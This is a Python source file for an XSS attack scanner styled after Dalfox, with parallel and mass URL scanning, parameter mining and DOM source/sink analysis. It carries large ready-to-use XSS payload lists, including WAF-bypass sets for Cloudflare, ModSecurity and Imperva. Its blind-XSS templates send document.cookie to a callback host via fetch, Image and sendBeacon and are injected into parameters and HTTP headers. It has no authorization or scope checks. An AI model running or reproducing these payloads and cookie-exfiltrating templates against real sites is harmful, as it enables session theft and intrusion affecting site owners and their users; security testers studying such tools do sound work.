#!/usr/bin/env python3
"""
ZYLON FUSION v5.0.0 - Dalfox-Style XSS Engine
Based on: https://github.com/hahwul/dalfox (Go XSS scanner - Python implementation)
Capabilities:
  - Fast parallel XSS scanning
  - Parameter analysis and mining
  - Blind XSS testing with callback
  - Custom payload injection
  - DOM XSS analysis (source/sink detection)
  - Content-type aware testing
  - Reflection point verification
  - WAF detection and evasion (Cloudflare/ModSecurity/Imperva/Akamai)
  - Mass URL scanning from file
  - Output in multiple formats
Termux Compatible | No Root Required | Python 3.13+
"""

import requests
import re
import os
import time
import random
import string
import urllib.parse
import hashlib
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# ============================================================================
# ANSI COLORS (Termux compatible)
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# ============================================================================
# DALFOX-STYLE XSS PAYLOAD DATABASE
# ============================================================================

# Basic XSS payloads for quick scanning
DALFOX_BASIC_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "<svg onload=alert(1)>",
    "'-alert(1)-'",
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '"><iframe src="javascript:alert(1)">',
    "<details open ontoggle=alert(1)>",
    "javascript:alert(1)",
    '<svg/onload=alert(1)>',
    '<img/src=x/onerror=alert(1)>',
    '<math><mtext><table><mglyph><style><!--</style>',
]

# Context-aware payloads - HTML attribute context
DALFOX_ATTR_PAYLOADS = [
    '" onmouseover="alert(1)"',
    "' onmouseover='alert(1)'",
    '" onfocus="alert(1)" autofocus="',
    "' onfocus='alert(1)' autofocus='",
    '" onerror="alert(1)"',
    'autofocus onfocus=alert(1) //',
    '" oninput="alert(1)" //',
    '" onchange="alert(1)" //',
    '" onclick="alert(1)" //',
    '" onmouseout="alert(1)" //',
]

# JavaScript context payloads
DALFOX_JS_PAYLOADS = [
    "';alert(1);//",
    "';alert(1)//",
    "\\';alert(1);//",
    "'';!--\"<XSS>=&{()}",
    "';document.location='javascript:alert(1)//",
    "x';alert(1);//",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "alert(1)//",
    "-alert(1)-",
    "1;alert(1)",
    "';return false;}alert(1);//",
    "x=x;alert(1);y=x",
    "\";alert(1)//",
    "'-alert(1)-'",
    "';alert(1)+'",
]

# URL/context payloads
DALFOX_URL_PAYLOADS = [
    'javascript:alert(1)',
    'javascript:void(alert(1))',
    'javascript:alert(document.cookie)',
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:alert(1)',
]

# WAF bypass payloads - Cloudflare
DALFOX_WAF_CLOUDFLARE = [
    '<script/xss>alert(1)</script>',
    '<img/src=x/onerror=alert(1)>',
    '<svg/onload=alert(1)//',
    '<ScRiPt>alert(1)</sCrIpT>',
    '<script>al\\x65rt(1)</script>',
    '<script>al\\u0065rt(1)</script>',
    '<script>al&#101;rt(1)</script>',
    '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    '<img src=x onerror=alert`1`>',
    '<details/open/ontoggle=alert(1)>',
    '<svg><animate onbegin=alert(1) attributeName=x>',
]

# WAF bypass payloads - ModSecurity
DALFOX_WAF_MODSEC = [
    '<script>prompt(1)</script>',
    '<img src=x onerror=prompt(1)>',
    '<svg/onload=prompt(1)>',
    '<script>confirm(1)</script>',
    '<img src=x onerror=confirm(1)>',
    '<input/onfocus=alert(1) autofocus>',
    '<script/src=data:,alert(1)>',
    '<svg><set attributeName=onmouseover to=alert(1)>',
    '<math><mi//xlink:href="javascript:alert(1)">click',
    '<script>%61lert(1)</script>',
]

# WAF bypass payloads - Imperva/Incapsula
DALFOX_WAF_IMPERVA = [
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    '<svg onload=alert(String.fromCharCode(88,83,83))>',
    '<body onload=alert(String.fromCharCode(88,83,83))>',
    '<input onfocus=alert(String.fromCharCode(88,83,83)) autofocus>',
    '<script>eval(atob(\'YWxlcnQoMSk=\'))</script>',
    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
]

# DOM XSS sources and sinks
DALFOX_DOM_SOURCES = [
    "location", "location.href", "location.hash", "location.search",
    "location.pathname", "document.URL", "document.documentURI",
    "document.referrer", "window.name", "document.cookie",
    "document.baseURI", "history.pushState", "history.replaceState",
    "window.location", "document.location",
]

DALFOX_DOM_SINKS = [
    "eval", "setTimeout", "setInterval", "Function",
    "document.write", "document.writeln", "innerHTML",
    "outerHTML", "insertAdjacentHTML", "srcdoc",
    "script.textContent", "jQuery.html", "jQuery.append",
    "$.html", "$().append", "document.domain",
]

# Common parameters to mine/test
DALFOX_COMMON_PARAMS = [
    "q", "search", "query", "name", "id", "page", "sort", "order",
    "dir", "file", "lang", "keyword", "term", "input", "user",
    "email", "url", "ref", "redirect", "return", "next", "dest",
    "target", "callback", "json", "jsonp", "api_key", "token",
    "access_token", "key", "cmd", "exec", "command", "action",
    "type", "category", "tag", "filter", "view", "template",
    "format", "output", "data", "body", "content", "message",
    "comment", "description", "title", "subject", "username",
    "password", "pass", "login", "signup", "register", "item",
    "product", "price", "amount", "quantity", "cart", "order_id",
]

# Blind XSS callback payloads
DALFOX_BLIND_PAYLOADS_TEMPLATE = [
    '<script src="{callback}"></script>',
    '"><script src="{callback}"></script>',
    "'><script src='{callback}'></script>",
    '<img src=x onerror="fetch(\'{callback}?c=\'+document.cookie)">',
    '"><img src=x onerror="fetch(\'{callback}?c=\'+document.cookie)">',
    "<script>new Image().src='{callback}?c='+document.cookie</script>",
    "'><script>new Image().src='{callback}?c='+document.cookie</script>",
    '<script>fetch("{callback}?c="+document.cookie)</script>',
    '<script>navigator.sendBeacon("{callback}?c="+document.cookie)</script>',
    '<svg onload="fetch(\'{callback}?c=\'+document.cookie)">',
]


class DalfoxEngine:
    """Dalfox-Style XSS Engine - Fast parallel XSS scanning with WAF evasion"""

    def __init__(self, target_url=None, parameter=None, method="GET", data=None,
                 headers=None, cookies=None, proxy=None, timeout=10, threads=10,
                 callback_url=None, output_format="dict"):
        self.target_url = target_url
        self.parameter = parameter
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.proxy = proxy
        self.timeout = timeout
        self.threads = threads
        self.callback_url = callback_url
        self.output_format = output_format
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36'
        })
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.findings = []
        self._lock = Lock()
        self._generate_markers()

    def _generate_markers(self):
        """Generate unique markers for reflection detection"""
        rand = ''.join(random.choices(string.ascii_lowercase, k=8))
        self.marker = f"dfx{rand}"
        self.marker_regex = re.compile(re.escape(self.marker), re.IGNORECASE)

    def _send_request(self, url, method=None, data=None, headers=None, param_name=None, param_value=None):
        """Send HTTP request with error handling and rate limiting"""
        try:
            m = method or self.method
            h = headers or self.headers
            if m == "GET":
                params = dict(self.data)
                if param_name and param_value is not None:
                    params[param_name] = param_value
                resp = self.session.get(url, params=params, headers=h,
                                       cookies=self.cookies, timeout=self.timeout,
                                       allow_redirects=True)
            else:
                post_data = dict(self.data)
                if param_name and param_value is not None:
                    post_data[param_name] = param_value
                resp = self.session.post(url, data=post_data, headers=h,
                                        cookies=self.cookies, timeout=self.timeout,
                                        allow_redirects=True)
            return resp
        except Exception:
            return None

    def _inject_payload(self, payload, param=None):
        """Inject XSS payload into target parameter"""
        p = param or self.parameter
        if not p:
            return None
        sep = "&" if "?" in self.target_url else "?"
        url = f"{self.target_url}{sep}{p}={urllib.parse.quote(payload, safe='')}"
        return self._send_request(url, method="GET")

    def _check_reflection(self, payload, response):
        """Check if payload is reflected in response and classify reflection type"""
        if not response:
            return False, "no_response"
        text = response.text
        # Exact reflection
        if payload in text:
            return True, "exact"
        # URL-decoded reflection
        decoded = urllib.parse.unquote(payload)
        if decoded != payload and decoded in text:
            return True, "decoded"
        # Partial reflection (some chars filtered)
        payload_no_special = re.sub(r'[<>"\'()]', '', payload)
        if payload_no_special and len(payload_no_special) > 3 and payload_no_special in text:
            return True, "partial"
        # Marker-based reflection
        if self.marker in text:
            return True, "marker"
        return False, "none"

    def _detect_context(self, response, param_value):
        """Detect injection context (HTML body, attribute, JS, URL, CSS)"""
        if not response:
            return "unknown"
        text = response.text
        # Check for JS context
        js_patterns = [
            rf'var\s+\w+\s*=\s*["\'][^"\']*{re.escape(param_value[:20])}',
            rf'["\'][^"\']*{re.escape(param_value[:20])}[^"\']*["\']\s*;',
            rf'<script[^>]*>[^<]*{re.escape(param_value[:15])}',
        ]
        for p in js_patterns:
            if re.search(p, text, re.IGNORECASE):
                return "javascript"
        # Check for HTML attribute context
        attr_patterns = [
            rf'\w+\s*=\s*["\'][^"\']*{re.escape(param_value[:20])}',
            rf'href\s*=\s*["\']?{re.escape(param_value[:20])}',
            rf'src\s*=\s*["\']?{re.escape(param_value[:20])}',
            rf'value\s*=\s*["\']?{re.escape(param_value[:20])}',
        ]
        for p in attr_patterns:
            if re.search(p, text, re.IGNORECASE):
                return "html_attribute"
        # Check for URL context
        if re.search(rf'href\s*=\s*["\']?[^"\']*{re.escape(param_value[:20])}', text, re.IGNORECASE):
            return "url"
        # Check for CSS context
        if re.search(rf'style\s*=\s*["\'][^"\']*{re.escape(param_value[:20])}', text, re.IGNORECASE):
            return "css"
        return "html_body"

    def _detect_waf(self, response):
        """Detect WAF from response headers and body"""
        waf_detected = None
        if not response:
            return None
        # Check headers
        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
        if 'cf-ray' in headers_lower:
            waf_detected = "Cloudflare"
        elif 'x-iinfo' in headers_lower:
            waf_detected = "Imperva/Incapsula"
        elif 'x-sucuri-id' in headers_lower:
            waf_detected = "Sucuri"
        elif 'x-akamai-transformed' in headers_lower:
            waf_detected = "Akamai"
        # Check body for WAF signatures
        body = response.text.lower()
        waf_body_sigs = {
            'Cloudflare': ['cloudflare', 'cf-browser-verification', 'attention required'],
            'ModSecurity': ['modsecurity', 'not acceptable'],
            'Imperva/Incapsula': ['incapsula', 'incident id'],
            'AWS WAF': ['aws waf', 'request blocked'],
            'Sucuri': ['sucuri', 'access denied'],
        }
        for waf_name, sigs in waf_body_sigs.items():
            for sig in sigs:
                if sig in body:
                    waf_detected = waf_name
                    break
        return waf_detected

    def _is_executable_reflection(self, payload, response_text):
        """Check if reflected payload is in an executable context"""
        executable_indicators = [
            '<script', 'onerror=', 'onload=', 'onfocus=', 'ontoggle=',
            'onmouseover=', 'javascript:', 'onclick=', 'oninput=',
            'onchange=', 'onmouseout=', 'onkeydown=', 'onkeyup=',
        ]
        for indicator in executable_indicators:
            if indicator in payload and indicator in response_text:
                return True
        return False

    def _get_content_type(self, response):
        """Get content type from response"""
        if not response:
            return "unknown"
        ct = response.headers.get('Content-Type', '').lower()
        if 'json' in ct:
            return "json"
        elif 'html' in ct:
            return "html"
        elif 'xml' in ct:
            return "xml"
        elif 'javascript' in ct:
            return "javascript"
        return "html"

    # ========================================================================
    # SCAN: Single URL XSS Scan (Dalfox-style parallel)
    # ========================================================================

    def scan(self, target=None):
        """Single URL XSS scan - Dalfox-style parallel scanning"""
        url = target or self.target_url
        if not url:
            return {'vulnerable': False, 'findings': [], 'details': {}, 'scan_type': 'dalfox_xss_scan'}

        print(f"{CYAN}{BOLD}[Dalfox] XSS Scan: {url}{RESET}")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'url': url,
                'timestamp': datetime.now().isoformat(),
                'parameter': self.parameter,
                'waf_detected': None,
                'injection_context': 'unknown',
                'total_payloads_tested': 0,
                'reflected_params': [],
            },
            'scan_type': 'dalfox_xss_scan',
        }

        # Phase 1: Detect WAF
        resp = self._send_request(url)
        if resp:
            results['details']['waf_detected'] = self._detect_waf(resp)
            results['details']['content_type'] = self._get_content_type(resp)

        # Phase 2: Detect reflection and context
        marker_payload = f"{self.marker}refltest"
        marker_resp = self._inject_payload(marker_payload)
        context = "unknown"
        if marker_resp:
            reflected, _ = self._check_reflection(self.marker, marker_resp)
            if reflected:
                context = self._detect_context(marker_resp, self.marker)
                results['details']['injection_context'] = context
                if not results['details']['waf_detected']:
                    results['details']['waf_detected'] = self._detect_waf(marker_resp)

        # Phase 3: Select and test payloads based on context and WAF
        context_payloads = {
            "html_body": DALFOX_BASIC_PAYLOADS,
            "html_attribute": DALFOX_ATTR_PAYLOADS,
            "javascript": DALFOX_JS_PAYLOADS,
            "url": DALFOX_URL_PAYLOADS,
            "css": DALFOX_BASIC_PAYLOADS[:5],
            "unknown": DALFOX_BASIC_PAYLOADS + DALFOX_JS_PAYLOADS,
        }
        payloads = list(context_payloads.get(context, DALFOX_BASIC_PAYLOADS))

        # Add WAF bypass payloads based on detected WAF
        waf = results['details']['waf_detected']
        if waf == "Cloudflare":
            payloads.extend(DALFOX_WAF_CLOUDFLARE)
        elif waf == "ModSecurity":
            payloads.extend(DALFOX_WAF_MODSEC)
        elif waf == "Imperva/Incapsula":
            payloads.extend(DALFOX_WAF_IMPERVA)
        else:
            # Add all WAF bypass payloads if WAF unknown
            payloads.extend(DALFOX_WAF_CLOUDFLARE[:5])
            payloads.extend(DALFOX_WAF_MODSEC[:5])

        # Phase 4: Parallel payload testing
        total_tested = 0
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for i, payload in enumerate(payloads):
                futures[executor.submit(self._test_payload, url, payload)] = payload
            for future in as_completed(futures):
                total_tested += 1
                try:
                    result = future.result()
                    if result:
                        with self._lock:
                            results['findings'].append(result)
                            if result.get('executable'):
                                results['vulnerable'] = True
                except Exception:
                    pass

        results['details']['total_payloads_tested'] = total_tested
        print(f"{GREEN}[Dalfox] Tested {total_tested} payloads | Findings: {len(results['findings'])}{RESET}")
        return results

    def _test_payload(self, url, payload):
        """Test a single payload - for parallel execution"""
        resp = self._inject_payload(payload)
        if not resp:
            return None
        reflected, refl_type = self._check_reflection(payload, resp)
        if reflected:
            executable = self._is_executable_reflection(payload, resp.text)
            return {
                'payload': payload,
                'reflection_type': refl_type,
                'executable': executable,
                'status_code': resp.status_code,
                'content_type': self._get_content_type(resp),
            }
        return None

    # ========================================================================
    # SCAN: Mass URL Scanning
    # ========================================================================

    def mass_scan(self, url_file):
        """Mass XSS scanning from file of URLs"""
        if not os.path.isfile(url_file):
            print(f"{RED}[Dalfox] File not found: {url_file}{RESET}")
            return {'vulnerable': False, 'findings': [], 'details': {'error': 'file_not_found'}, 'scan_type': 'dalfox_mass_scan'}

        with open(url_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]

        print(f"{CYAN}{BOLD}[Dalfox] Mass Scan: {len(urls)} URLs{RESET}")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'urls_scanned': len(urls),
                'timestamp': datetime.now().isoformat(),
                'vulnerable_count': 0,
            },
            'scan_type': 'dalfox_mass_scan',
        }

        def scan_single_url(url):
            old_target = self.target_url
            self.target_url = url
            self._generate_markers()
            result = self.scan(url)
            self.target_url = old_target
            return result

        with ThreadPoolExecutor(max_workers=min(self.threads, len(urls))) as executor:
            futures = {executor.submit(scan_single_url, url): url for url in urls}
            for future in as_completed(futures):
                url = futures[future]
                try:
                    scan_result = future.result()
                    if scan_result.get('vulnerable'):
                        results['vulnerable'] = True
                        results['details']['vulnerable_count'] += 1
                        results['findings'].append({
                            'url': url,
                            'findings': scan_result.get('findings', []),
                        })
                except Exception:
                    pass

        print(f"{GREEN}[Dalfox] Mass scan complete: {results['details']['vulnerable_count']}/{len(urls)} vulnerable{RESET}")
        return results

    # ========================================================================
    # SCAN: Parameter Analysis
    # ========================================================================

    def analyze_params(self, url=None):
        """Parameter analysis and mining"""
        target = url or self.target_url
        if not target:
            return {'vulnerable': False, 'findings': [], 'details': {}, 'scan_type': 'dalfox_param_analysis'}

        print(f"{CYAN}{BOLD}[Dalfox] Parameter Analysis: {target}{RESET}")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'url': target,
                'timestamp': datetime.now().isoformat(),
                'params_in_url': [],
                'params_reflected': [],
                'params_tested': 0,
                'mined_params': [],
            },
            'scan_type': 'dalfox_param_analysis',
        }

        # Extract existing URL parameters
        parsed = urllib.parse.urlparse(target)
        existing_params = list(urllib.parse.parse_qs(parsed.query).keys())
        results['details']['params_in_url'] = existing_params

        # Test existing parameters for reflection
        for param in existing_params:
            self._generate_markers()
            marker_payload = f"{self.marker}analysistest"
            resp = self._inject_payload(marker_payload, param=param)
            if resp and self.marker in resp.text:
                context = self._detect_context(resp, self.marker)
                results['details']['params_reflected'].append({
                    'parameter': param,
                    'context': context,
                })
                results['findings'].append({
                    'parameter': param,
                    'reflected': True,
                    'context': context,
                    'type': 'reflected_param',
                })

        # Mine common parameters
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        for param in DALFOX_COMMON_PARAMS:
            self._generate_markers()
            marker_payload = f"{self.marker}minetest"
            sep = "&" if "?" in base_url else "?"
            test_url = f"{base_url}{sep}{param}={urllib.parse.quote(marker_payload, safe='')}"
            resp = self._send_request(test_url)
            if resp and self.marker in resp.text:
                context = self._detect_context(resp, self.marker)
                results['details']['mined_params'].append({
                    'parameter': param,
                    'context': context,
                })
                results['findings'].append({
                    'parameter': param,
                    'reflected': True,
                    'context': context,
                    'type': 'mined_param',
                })

        results['details']['params_tested'] = len(existing_params) + len(DALFOX_COMMON_PARAMS)
        if results['details']['params_reflected'] or results['details']['mined_params']:
            results['vulnerable'] = True

        total_reflected = len(results['details']['params_reflected']) + len(results['details']['mined_params'])
        print(f"{GREEN}[Dalfox] Params tested: {results['details']['params_tested']} | Reflected: {total_reflected}{RESET}")
        return results

    # ========================================================================
    # SCAN: Blind XSS Testing
    # ========================================================================

    def test_blind(self, url=None, callback_url=None):
        """Blind XSS testing with callback URL"""
        target = url or self.target_url
        cb = callback_url or self.callback_url
        if not target:
            return {'vulnerable': False, 'findings': [], 'details': {'error': 'no_target'}, 'scan_type': 'dalfox_blind_xss'}

        if not cb:
            return {
                'vulnerable': False,
                'findings': [],
                'details': {'error': 'no_callback_url', 'note': 'Set callback_url parameter (e.g., interactsh or Burp Collaborator)'},
                'scan_type': 'dalfox_blind_xss',
            }

        print(f"{CYAN}{BOLD}[Dalfox] Blind XSS Test: {target} | Callback: {cb}{RESET}")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'url': target,
                'callback_url': cb,
                'timestamp': datetime.now().isoformat(),
                'payloads_injected': 0,
                'headers_injected': 0,
            },
            'scan_type': 'dalfox_blind_xss',
        }

        # Generate blind payloads with callback
        blind_payloads = [p.format(callback=cb) for p in DALFOX_BLIND_PAYLOADS_TEMPLATE]

        # Inject into parameter
        for payload in blind_payloads:
            resp = self._inject_payload(payload)
            results['details']['payloads_injected'] += 1
            results['findings'].append({
                'payload': payload[:100],
                'injection_point': 'parameter',
                'status_code': resp.status_code if resp else 'error',
            })

        # Inject into HTTP headers (blind XSS vectors)
        header_injection_points = [
            'X-Forwarded-For', 'X-Original-URL', 'Referer', 'User-Agent',
            'X-Custom-Header', 'Origin', 'X-Forwarded-Host',
        ]
        for header in header_injection_points:
            for payload in blind_payloads[:3]:  # Test top 3 in each header
                h = dict(self.headers)
                h[header] = payload
                try:
                    self.session.get(target, headers=h, timeout=self.timeout)
                    results['details']['headers_injected'] += 1
                    results['findings'].append({
                        'payload': payload[:80],
                        'injection_point': f'header:{header}',
                        'status_code': 'injected',
                    })
                except Exception:
                    pass

        print(f"{GREEN}[Dalfox] Blind XSS: {results['details']['payloads_injected']} param + {results['details']['headers_injected']} header injections{RESET}")
        return results

    # ========================================================================
    # SCAN: DOM XSS Testing
    # ========================================================================

    def test_dom(self, url=None):
        """DOM XSS analysis with source/sink detection"""
        target = url or self.target_url
        if not target:
            return {'vulnerable': False, 'findings': [], 'details': {}, 'scan_type': 'dalfox_dom_xss'}

        print(f"{CYAN}{BOLD}[Dalfox] DOM XSS Analysis: {target}{RESET}")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'url': target,
                'timestamp': datetime.now().isoformat(),
                'sources_found': [],
                'sinks_found': [],
                'potential_flows': [],
                'js_files_analyzed': 0,
            },
            'scan_type': 'dalfox_dom_xss',
        }

        resp = self._send_request(target)
        if not resp:
            return results

        text = resp.text

        # Phase 1: Extract and analyze inline scripts
        script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', text,
                                  re.IGNORECASE | re.DOTALL)
        external_scripts = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', text,
                                     re.IGNORECASE)

        all_js = '\n'.join(script_blocks)
        results['details']['js_files_analyzed'] = len(external_scripts)

        # Phase 2: Find DOM sources
        for source in DALFOX_DOM_SOURCES:
            src_name = source.split(".")[-1] if "." in source else source
            patterns = [
                rf'{re.escape(source)}\b',
                rf'document\.{re.escape(src_name)}\b' if "." in source else rf'\b{re.escape(source)}\b',
            ]
            for p in patterns:
                if re.search(p, all_js):
                    results['details']['sources_found'].append(source)
                    break

        # Phase 3: Find DOM sinks
        for sink in DALFOX_DOM_SINKS:
            sink_name = sink.split(".")[-1] if "." in sink else sink
            if re.search(rf'\b{re.escape(sink_name)}\s*\(', all_js):
                results['details']['sinks_found'].append(sink)

        # Phase 4: Detect source->sink flows
        for source in results['details']['sources_found']:
            for sink in results['details']['sinks_found']:
                src_name = source.split(".")[-1] if "." in source else source
                sink_name = sink.split(".")[-1] if "." in sink else sink
                # Check same script block
                for block in script_blocks:
                    if src_name in block and sink_name in block:
                        # Extract the relevant code snippet
                        idx = block.find(src_name)
                        snippet = block[max(0, idx-50):idx+100]
                        flow = {
                            'source': source,
                            'sink': sink,
                            'snippet': snippet[:200],
                        }
                        results['details']['potential_flows'].append(flow)
                        results['findings'].append({
                            'type': 'dom_xss_flow',
                            'source': source,
                            'sink': sink,
                            'snippet': snippet[:200],
                        })
                        results['vulnerable'] = True

        # Phase 5: Check for dangerous patterns in external JS references
        for script_url in external_scripts[:10]:
            try:
                js_resp = self.session.get(script_url if script_url.startswith('http')
                                          else urllib.parse.urljoin(target, script_url),
                                          timeout=self.timeout)
                if js_resp:
                    js_text = js_resp.text
                    for source in DALFOX_DOM_SOURCES[:5]:
                        src_name = source.split(".")[-1] if "." in source else source
                        if src_name in js_text:
                            for sink in DALFOX_DOM_SINKS[:5]:
                                sink_name = sink.split(".")[-1] if "." in sink else sink
                                if f"{sink_name}(" in js_text:
                                    results['findings'].append({
                                        'type': 'external_js_flow',
                                        'source': source,
                                        'sink': sink,
                                        'js_file': script_url,
                                    })
                                    results['vulnerable'] = True
            except Exception:
                pass

        print(f"{GREEN}[Dalfox] DOM Sources: {len(results['details']['sources_found'])} | "
              f"Sinks: {len(results['details']['sinks_found'])} | "
              f"Flows: {len(results['details']['potential_flows'])}{RESET}")
        return results

    # ========================================================================
    # SCAN: Custom Payload Generation
    # ========================================================================

    def generate_payloads(self, context="all"):
        """Generate custom XSS payloads based on context"""
        payloads = {
            "html_body": DALFOX_BASIC_PAYLOADS,
            "html_attribute": DALFOX_ATTR_PAYLOADS,
            "javascript": DALFOX_JS_PAYLOADS,
            "url": DALFOX_URL_PAYLOADS,
            "waf_cloudflare": DALFOX_WAF_CLOUDFLARE,
            "waf_modsecurity": DALFOX_WAF_MODSEC,
            "waf_imperva": DALFOX_WAF_IMPERVA,
        }

        if context == "all":
            all_payloads = []
            for ctx_payloads in payloads.values():
                all_payloads.extend(ctx_payloads)
            # Deduplicate
            all_payloads = list(dict.fromkeys(all_payloads))
            return {
                'vulnerable': False,
                'findings': [],
                'details': {
                    'context': 'all',
                    'total_payloads': len(all_payloads),
                    'payloads': all_payloads,
                },
                'scan_type': 'dalfox_payload_gen',
            }

        selected = payloads.get(context, DALFOX_BASIC_PAYLOADS)
        return {
            'vulnerable': False,
            'findings': [],
            'details': {
                'context': context,
                'total_payloads': len(selected),
                'payloads': selected,
            },
            'scan_type': 'dalfox_payload_gen',
        }

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target=None, scan_type='full', **kwargs):
        """Main entry point for Dalfox Engine"""
        url = target or self.target_url
        if not url:
            return {'vulnerable': False, 'findings': [], 'details': {'error': 'no_target'}, 'scan_type': 'dalfox_xss'}

        scan_methods = {
            'full': lambda: self._full_scan(url),
            'quick': lambda: self.scan(url),
            'mass': lambda: self.mass_scan(kwargs.get('url_file', '')),
            'blind': lambda: self.test_blind(url, kwargs.get('callback_url', self.callback_url)),
            'dom': lambda: self.test_dom(url),
            'param_analysis': lambda: self.analyze_params(url),
            'payload_gen': lambda: self.generate_payloads(kwargs.get('context', 'all')),
        }

        if scan_type in scan_methods:
            return scan_methods[scan_type]()
        return self._full_scan(url)

    def _full_scan(self, url):
        """Full Dalfox XSS scan - all techniques"""
        print(f"{RED}{BOLD}[Dalfox] Full XSS Scan: {url}{RESET}")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'url': url,
                'timestamp': datetime.now().isoformat(),
                'phases_completed': [],
            },
            'scan_type': 'dalfox_xss_full',
        }

        # Phase 1: Parameter Analysis
        print(f"{CYAN}  [Phase 1/4] Parameter Analysis...{RESET}")
        param_result = self.analyze_params(url)
        results['details']['param_analysis'] = param_result.get('details', {})
        results['details']['phases_completed'].append('param_analysis')
        results['findings'].extend(param_result.get('findings', []))

        # Phase 2: Reflected XSS Scan
        print(f"{CYAN}  [Phase 2/4] Reflected XSS Scan...{RESET}")
        xss_result = self.scan(url)
        if xss_result.get('vulnerable'):
            results['vulnerable'] = True
        results['details']['phases_completed'].append('reflected_xss')
        results['findings'].extend(xss_result.get('findings', []))

        # Phase 3: DOM XSS Analysis
        print(f"{CYAN}  [Phase 3/4] DOM XSS Analysis...{RESET}")
        dom_result = self.test_dom(url)
        if dom_result.get('vulnerable'):
            results['vulnerable'] = True
        results['details']['phases_completed'].append('dom_xss')
        results['findings'].extend(dom_result.get('findings', []))

        # Phase 4: Blind XSS (if callback URL available)
        if self.callback_url:
            print(f"{CYAN}  [Phase 4/4] Blind XSS Test...{RESET}")
            blind_result = self.test_blind(url)
            results['details']['phases_completed'].append('blind_xss')
            results['findings'].extend(blind_result.get('findings', []))
        else:
            results['details']['phases_completed'].append('blind_xss_skipped')

        print(f"{GREEN}[Dalfox] Full scan complete: {len(results['findings'])} findings{RESET}")
        return results


# ============================================================================
# MODULE-LEVEL RUN FUNCTION
# ============================================================================

def run(target, scan_type='full', **kwargs):
    """Module-level entry point for Dalfox Engine"""
    engine = DalfoxEngine(
        target_url=target,
        parameter=kwargs.get('parameter', 'q'),
        method=kwargs.get('method', 'GET'),
        data=kwargs.get('data'),
        headers=kwargs.get('headers'),
        cookies=kwargs.get('cookies'),
        proxy=kwargs.get('proxy'),
        timeout=kwargs.get('timeout', 10),
        threads=kwargs.get('threads', 10),
        callback_url=kwargs.get('callback_url'),
    )
    return engine.run(target=target, scan_type=scan_type, **kwargs)
